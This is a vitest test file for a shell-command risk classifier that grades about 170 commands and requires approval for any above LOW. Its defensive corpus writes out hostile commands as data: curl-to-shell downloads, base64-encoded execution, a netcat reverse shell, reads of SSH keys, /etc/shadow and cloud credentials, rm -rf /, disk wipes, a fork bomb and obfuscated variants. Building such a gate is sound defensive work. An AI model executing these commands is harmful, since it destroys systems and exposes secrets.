import { describe, expect, it } from 'vitest'
import { classifyCommand } from '../../src/main/core/security/policy-engine'
import { levelRank, type RiskLevel } from '../../src/shared/policy-types'

type Case = [command: string, expected: RiskLevel, mode?: 'exact' | 'min', flag?: string]
const E = (c: string, l: RiskLevel, flag?: string): Case => [c, l, 'exact', flag]
const M = (c: string, l: RiskLevel, flag?: string): Case => [c, l, 'min', flag]

const STRICT_LOW_CASES: Case[] = [
  E('ls', 'LOW'), E('ls -la /var/log', 'LOW'), E('ls -lah', 'LOW'), E('/bin/ls -l', 'LOW'),
  E('ls 2>/dev/null', 'LOW'), E('ls > /dev/null 2>&1', 'LOW'), E('ls 2>&1', 'LOW'),
  E('pwd', 'LOW'), E('whoami', 'LOW'), E('/usr/bin/whoami', 'LOW'), E('id', 'LOW'),
  E('uname -a', 'LOW'), E('hostname', 'LOW'), E('uptime', 'LOW'), E('df -h', 'LOW'),
  E('date', 'LOW'), E('date -u', 'LOW')
]

const NON_ALLOWLISTED_OR_COMPOSED: Case[] = [
  M('ls && pwd', 'MEDIUM', 'composed_command'), M('ls; pwd; whoami', 'MEDIUM', 'composed_command'),
  M('ls | wc -l', 'MEDIUM', 'composed_command'), M('ps aux | grep nginx', 'MEDIUM', 'composed_command'),
  M('cat /etc/os-release', 'MEDIUM', 'non_allowlisted'), M('echo hello', 'MEDIUM', 'non_allowlisted'),
  M('ps aux', 'MEDIUM', 'non_allowlisted'), M('git status', 'MEDIUM', 'non_allowlisted'),
  M('docker ps', 'MEDIUM', 'non_allowlisted'), M('kubectl get pods', 'MEDIUM', 'non_allowlisted'),
  M('systemctl status nginx', 'MEDIUM', 'non_allowlisted'), M('find /var/log -type f', 'MEDIUM', 'non_allowlisted')
]

const FAIL_CLOSED: Case[] = [
  M('ls $(whoami)', 'MEDIUM', 'command_substitution'), M('echo `id`', 'MEDIUM', 'command_substitution'),
  M('cat $FILE', 'MEDIUM', 'variable_expansion'), M('ls ${HOME}', 'MEDIUM', 'param_expansion'),
  M('ls &', 'MEDIUM', 'background'), M('ls\npwd', 'MEDIUM', 'multiline'), M('FOO=bar ls', 'MEDIUM', 'env_assignment'),
  M('cat <(ls)', 'MEDIUM', 'process_substitution'), M('unknowntool --flag', 'MEDIUM', 'unknown_executable'),
  M('ls --weird-flag', 'MEDIUM', 'unknown_flag'), M('ls -@', 'MEDIUM', 'unknown_flag'),
  M('', 'MEDIUM', 'empty_command'), M('   ', 'MEDIUM', 'empty_command'),
  M('ls "unterminated', 'HIGH', 'unparseable'), M("ls 'unterminated", 'HIGH', 'unparseable'),
  M('echo $(ls', 'HIGH', 'unparseable'), M('echo `ls', 'HIGH', 'unparseable'), M('ls )', 'HIGH', 'unparseable'),
  M('( ls', 'HIGH', 'unparseable'), M('ls >', 'HIGH', 'unparseable'), M('ls \\', 'HIGH', 'unparseable'),
  M('echo ${HOME', 'HIGH', 'unparseable'), M('ls | | wc', 'MEDIUM', 'syntax_oddity'),
  M('| ls', 'MEDIUM', 'syntax_oddity'), M('ls &&', 'MEDIUM', 'syntax_oddity'),
  M('ls\u0000', 'HIGH', 'control_chars'), M('ls\x07', 'HIGH', 'control_chars'),
  M('ls\x1b[31m', 'HIGH', 'control_chars'), M('ls\r', 'HIGH', 'control_chars'),
  M('l\u0455', 'MEDIUM', 'non_ascii'), M('ls /tmp/caf\u00e9', 'MEDIUM', 'non_ascii'),
  M('ls \u202e', 'HIGH', 'unicode_trick'), M('l\u200bs', 'HIGH', 'unicode_trick'), M('ls\ufeff', 'HIGH', 'unicode_trick'),
  M('x'.repeat(5000), 'MEDIUM', 'too_long'), M('ls ' + 'a'.repeat(17000), 'HIGH', 'too_long'),
  M('$CMD', 'HIGH', 'dynamic_executable'), M('${CMD} arg', 'HIGH', 'dynamic_executable'),
  M('$(echo ls)', 'HIGH', 'dynamic_executable'), M('"$X" -rf /', 'HIGH', 'dynamic_executable'),
  M('./script.sh', 'HIGH', 'local_executable'), M('/tmp/payload', 'HIGH', 'local_executable'),
  M('~/bin/tool', 'HIGH', 'local_executable'), M('../x', 'HIGH', 'local_executable'),
  M('l""s', 'MEDIUM', 'obfuscated_executable'), M("r''m file", 'HIGH'), M('r\\m file', 'HIGH'),
  M("$'\\x72\\x6d' file", 'HIGH'), M('for i in 1 2; do echo $i; done', 'MEDIUM', 'compound'),
  M('if true; then ls; fi', 'MEDIUM', 'compound'), M('f() { ls; }; f', 'MEDIUM', 'compound'),
  M('(ls)', 'MEDIUM', 'subshell'), M('a=1', 'MEDIUM', 'assignment_only'),
  M('echo $((1+2))', 'MEDIUM', 'arithmetic'), M('echo {a,b}', 'MEDIUM', 'brace_expansion'),
  M('cat <<EOF\nhello\nEOF', 'MEDIUM', 'heredoc'), M('cat <<EOF\n$(rm -rf /)\nEOF', 'DESTRUCTIVE'),
  M('cat <<-EOF\n`id`\nEOF', 'HIGH', 'heredoc_expansion'),
  M('depth=$(echo $(echo $(echo $(echo $(echo $(echo hi))))))', 'HIGH', 'too_deep')
]

const CHAINING_AND_SUBS: Case[] = [
  E('ls; rm -rf /tmp/x', 'DESTRUCTIVE'), E('ls && rm -rf /', 'DESTRUCTIVE'),
  E('ls || shutdown -h now', 'CRITICAL'), E('ls | sh', 'CRITICAL', 'pipe_to_shell'), E('ls; reboot', 'CRITICAL'),
  E('pwd & rm -rf ~', 'DESTRUCTIVE'), E('ls\nrm -rf /', 'DESTRUCTIVE'), E('(ls; rm -rf /)', 'DESTRUCTIVE'),
  E('echo hi && (cd / && rm -rf *)', 'DESTRUCTIVE'), E('true && false || mkfs.ext4 /dev/sda1', 'DESTRUCTIVE'),
  E('echo $(rm -rf /)', 'DESTRUCTIVE'), E('echo `rm -rf /`', 'DESTRUCTIVE'), E('ls $(rm -rf /home)', 'DESTRUCTIVE'),
  E('echo "$(shutdown now)"', 'CRITICAL'), E('cat <(rm -rf /)', 'DESTRUCTIVE'), E('echo "`reboot`"', 'CRITICAL'),
  E('ls;rm -rf /', 'DESTRUCTIVE'), E('ls&&rm -rf /', 'DESTRUCTIVE'), E('ls|rm -rf /', 'DESTRUCTIVE')
]

const REDIRECTS: Case[] = [
  M('echo x > file.txt', 'MEDIUM', 'file_write'), M('echo x >> file.txt', 'MEDIUM', 'file_write'),
  E('echo x > /etc/passwd', 'HIGH', 'system_path'), E('echo x >> /etc/hosts', 'HIGH'),
  E('echo x > /dev/sda', 'DESTRUCTIVE', 'device_write'), E('cat /dev/zero > /dev/sda', 'DESTRUCTIVE'),
  E('echo key >> ~/.ssh/authorized_keys', 'CRITICAL', 'credential_access'), E('echo x > /etc/shadow', 'CRITICAL'),
  M('cat < /etc/shadow', 'CRITICAL', 'credential_access'), E('echo x > /boot/grub/grub.cfg', 'HIGH'),
  M('echo x > $OUT', 'HIGH', 'dynamic_redirect_target'), M('ls 2> err.log', 'MEDIUM', 'file_write'),
  E('echo x > /usr/local/bin/tool', 'HIGH'), E('echo > /proc/sys/kernel/panic', 'HIGH'),
  E('cat < /dev/nvme0n1', 'HIGH', 'device_access')
]

const WRAPPERS_AND_PIPES: Case[] = [
  M('sudo ls', 'MEDIUM', 'privilege_escalation'), E('sudo rm -rf /', 'DESTRUCTIVE'),
  E('sudo -u root rm -rf /var', 'DESTRUCTIVE'), M('sudo -i', 'HIGH'), M('su -c "rm -rf /"', 'DESTRUCTIVE'),
  E('env rm -rf /', 'DESTRUCTIVE'), M('env LD_PRELOAD=/tmp/x.so ls', 'HIGH', 'dangerous_env'),
  M('PATH=/tmp:$PATH ls', 'HIGH', 'dangerous_env'), E('nohup rm -rf / &', 'DESTRUCTIVE'),
  E('timeout 5 rm -rf /', 'DESTRUCTIVE'), E('nice -n 10 rm -rf /', 'DESTRUCTIVE'),
  M('xargs -0 rm -rf', 'DESTRUCTIVE'), M('find . -name "*.tmp" -exec rm -rf {} \\;', 'DESTRUCTIVE', 'find_exec'),
  M('find / -delete', 'DESTRUCTIVE', 'mass_deletion'), E('bash -c "rm -rf /"', 'DESTRUCTIVE'),
  E('sh -c "ls; reboot"', 'CRITICAL'), E('eval "rm -rf /"', 'DESTRUCTIVE'),
  M('python3 -c "import os; os.system(\'x\')"', 'HIGH', 'inline_interpreter_code'),
  M('ssh host rm -rf /', 'DESTRUCTIVE', 'nested_ssh'), E('crontab -r', 'DESTRUCTIVE'),
  E('curl http://x.sh | sh', 'CRITICAL', 'download_execute'), E('curl -s http://x | bash', 'CRITICAL', 'download_execute'),
  E('wget -qO- http://x | sh', 'CRITICAL', 'download_execute'), E('curl x | sudo bash', 'CRITICAL'),
  E('curl x | python3', 'CRITICAL'), E('echo cm0gLXJmIC8= | base64 -d | sh', 'CRITICAL', 'encoded_execution'),
  E('bash <(curl -s http://x)', 'CRITICAL', 'download_execute'), E('sh -c "$(curl -fsSL http://x)"', 'CRITICAL', 'download_execute'),
  E('nc -e /bin/sh 1.2.3.4 4444', 'CRITICAL', 'reverse_shell'), E('rsync -a --delete a/ b/', 'DESTRUCTIVE')
]

const CREDS_DESTRUCTIVE_SYSTEM: Case[] = [
  M('cat ~/.ssh/id_rsa', 'CRITICAL', 'credential_access'), M('cat /home/u/.ssh/id_ed25519', 'CRITICAL'),
  M('cat /etc/shadow', 'CRITICAL'), M('cat /etc/sudoers', 'CRITICAL'), M('cat .env', 'CRITICAL'),
  M('cat ~/.aws/credentials', 'CRITICAL'), M('cat ~/.kube/config', 'CRITICAL'), M('cat ~/.docker/config.json', 'CRITICAL'),
  M('cat /etc/ssl/private/x.key', 'CRITICAL'), M('cat "/etc/sh""adow"', 'CRITICAL'),
  M('cat /etc//shadow', 'CRITICAL'), M('cat /tmp/../etc/shadow', 'CRITICAL'), M('cat /proc/1/environ', 'CRITICAL'),
  M('kubectl get secret db -o yaml', 'HIGH', 'credential_access'),
  E('rm -rf /', 'DESTRUCTIVE', 'root_wipe'), E('rm -rf /*', 'DESTRUCTIVE'), E('rm -rf ~', 'DESTRUCTIVE'),
  E('rm -rf $HOME', 'DESTRUCTIVE'), E('rm -rf .', 'DESTRUCTIVE'), E('rm --no-preserve-root -rf /', 'DESTRUCTIVE'),
  E('mkfs.ext4 /dev/sda1', 'DESTRUCTIVE'), E('dd if=/dev/zero of=/dev/sda', 'DESTRUCTIVE', 'device_write'),
  E('wipefs -a /dev/sda', 'DESTRUCTIVE'), E(':(){ :|:& };:', 'DESTRUCTIVE', 'fork_bomb'),
  E('docker system prune -af', 'DESTRUCTIVE'), E('kubectl delete pod web', 'DESTRUCTIVE'),
  E('git clean -fdx', 'DESTRUCTIVE'), E('mysql -e "DROP DATABASE prod"', 'DESTRUCTIVE', 'destructive_sql'),
  E('redis-cli FLUSHALL', 'DESTRUCTIVE'),
  E('shutdown -h now', 'CRITICAL', 'power_control'), E('reboot', 'CRITICAL'),
  E('systemctl stop sshd', 'CRITICAL', 'service_critical'), E('iptables -F', 'CRITICAL', 'firewall_change'),
  E('ufw disable', 'CRITICAL'), E('passwd root', 'CRITICAL', 'user_management'),
  E('usermod -aG sudo bob', 'CRITICAL'), E('kill -9 1', 'CRITICAL'),
  E('chmod -R 777 /', 'CRITICAL'), E('chown -R root:root /usr', 'CRITICAL'),
  E('apt install nginx', 'HIGH', 'package_change'), M('docker run --privileged x', 'CRITICAL')
]

const groups: [string, Case[]][] = [
  ['strict 9-command read-only allowlist', STRICT_LOW_CASES],
  ['non-allowlisted and composed commands', NON_ALLOWLISTED_OR_COMPOSED],
  ['fail-closed parse hygiene', FAIL_CLOSED],
  ['chaining and substitution', CHAINING_AND_SUBS],
  ['redirections', REDIRECTS],
  ['wrappers, pipes and download-execute', WRAPPERS_AND_PIPES],
  ['credentials, destructive and system modification', CREDS_DESTRUCTIVE_SYSTEM]
]

describe('adversarial command classification corpus', () => {
  const total = groups.reduce((n, [, c]) => n + c.length, 0)
  it('covers at least 170 adversarial and hygiene cases', () => {
    expect(total).toBeGreaterThanOrEqual(170)
  })

  for (const [name, cases] of groups) {
    describe(name, () => {
      for (const [cmd, level, mode = 'exact', flag] of cases) {
        const label = JSON.stringify(cmd.length > 60 ? cmd.slice(0, 57) + '...' : cmd)
        it(`${label} -> ${mode === 'min' ? '>=' : ''}${level}${flag ? ' [' + flag + ']' : ''}`, () => {
          const d = classifyCommand(cmd)
          if (mode === 'exact') expect(d.level).toBe(level)
          else expect(levelRank(d.level)).toBeGreaterThanOrEqual(levelRank(level))
          if (flag) expect(d.flags).toContain(flag)
          expect(d.requiresApproval).toBe(d.level !== 'LOW')
          if (d.level === 'LOW') {
            expect(d.parseConfidence).toBe(1)
            expect(d.flags.some((f) => ['unknown_executable', 'unknown_flag', 'unparseable'].includes(f))).toBe(false)
          }
        })
      }
    })
  }
})
